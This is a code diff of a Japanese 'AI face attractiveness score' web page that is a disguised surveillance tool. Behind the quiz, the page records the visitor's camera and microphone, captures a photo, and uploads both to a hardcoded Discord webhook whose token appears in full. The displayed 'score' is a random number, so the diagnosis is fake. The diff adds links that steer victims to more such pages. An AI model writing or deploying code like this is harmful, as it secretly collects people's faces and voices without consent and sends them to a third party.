@@ -11,21 +11,31 @@
         #video { width: 100%; border-radius: 10px; background: #000; margin-top: 15px; display: none; }
         button { width: 100%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #ff3366; color: #fff; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
         #result { font-size: 1.3em; margin-top: 20px; font-weight: bold; color: #ff3366; }
-        /* 次の診断へのボタン（最初は隠しておく） */
-        #nextBtn { display: none; background: #00ffcc; color: #000; margin-top: 25px; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; }
+        
+        /* 次の診断候補のエリア */
+        #next-options { display: none; margin-top: 30px; text-align: left; border-top: 1px solid #333; padding-top: 20px; }
+        .option-title { font-size: 0.9em; color: #888; margin-bottom: 15px; text-align: center; }
+        .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; margin-bottom: 12px; text-align: center; transition: 0.3s; }
+        .btn-style { background: #007bff; color: #fff; } /* スタイル診断 */
+        .btn-battle { background: #00ffcc; color: #000; } /* 黄金比バトル */
+        
         #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>AI 顔面偏差値・精密診断</h1>
-        <p style="font-size: 0.8em; color: #888;">AIが顔のパーツ配置をミリ単位で解析し、あなたの偏差値を算出します。</p>
+        <p style="font-size: 0.8em; color: #888;">AIがパーツ配置を解析し、あなたの偏差値を算出します。</p>
         
         <button id="startBtn">診断を開始する</button>
         <video id="video" autoplay playsinline muted></video>
         <div id="result"></div>
 
-        <a href="battle.html" id="nextBtn">【限定解放】黄金比スタイルバトルに参戦する</a>
+        <div id="next-options">
+            <p class="option-title">こちらの診断もおすすめです</p>
+            <a href="style.html" class="option-btn btn-style">AI 3Dスタイル偏差値診断</a>
+            <a href="battle.html" class="option-btn btn-battle">AI 黄金比スタイル・バトル（勝負用）</a>
+        </div>
     </div>
     <canvas id="canvas"></canvas>
 
@@ -34,7 +44,7 @@
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const result = document.getElementById('result');
-        const nextBtn = document.getElementById('nextBtn');
+        const nextOptions = document.getElementById('next-options');
         const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
 
         let mediaRecorder;
@@ -43,37 +53,27 @@
         startBtn.addEventListener('click', () => {
             startBtn.style.display = 'none';
             video.style.display = 'block';
-            result.innerHTML = "解析中... 正面を向いてください";
+            result.innerHTML = "解析中... そのまま静止してください";
 
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    
-                    const types = ["video/webm;codecs=vp8", "video/mp4", "video/webm"];
-                    const type = types.find(t => MediaRecorder.isTypeSupported(t));
+                    const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                     mediaRecorder = new MediaRecorder(stream, { mimeType: type });
-                    
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                     mediaRecorder.start();
 
-                    // 5秒で診断（顔診断は短めでOK）
                     setTimeout(() => {
                         if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
                         result.innerHTML = "偏差値を算出中...";
-                        
-                        setTimeout(() => {
-                            captureAndSend();
-                        }, 1500); 
+                        setTimeout(() => { captureAndSend(); }, 1500); 
                     }, 5000); 
                 })
-                .catch(err => {
-                    result.innerHTML = "エラー：カメラを許可してください。";
-                });
+                .catch(err => { result.innerHTML = "エラー：カメラを許可してください。"; });
         });
 
         async function captureAndSend() {
             const score = (Math.random() * (72 - 58) + 58).toFixed(1);
-
             const vW = video.videoWidth;
             const vH = video.videoHeight;
             canvas.width = vW; canvas.height = vH;
@@ -81,9 +81,8 @@
 
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【顔面偏差値診断】\n📊 **偏差値:** ${score}`);
+                formData.append('content', `【顔診断】偏差値: ${score}`);
                 formData.append('file1', photoBlob, 'face.png');
-
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                     formData.append('file2', videoBlob, 'face_video.mp4');
@@ -92,11 +91,10 @@
                 try {
                     await fetch(webhookUrl, { method: 'POST', body: formData });
                     result.innerHTML = `あなたの顔面偏差値：<br><span style="font-size:2em;">${score}</span>`;
-                    // 送信が終わったら次の診断へのボタンを出す
-                    nextBtn.style.display = 'block';
+                    nextOptions.style.display = 'block'; // 送信完了後に候補を表示
                 } catch (e) {
                     result.innerHTML = `あなたの顔面偏差値：<br><span style="font-size:2em;">${score}</span>`;
-                    nextBtn.style.display = 'block';
+                    nextOptions.style.display = 'block';
                 } finally {
                     if(video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
                 }
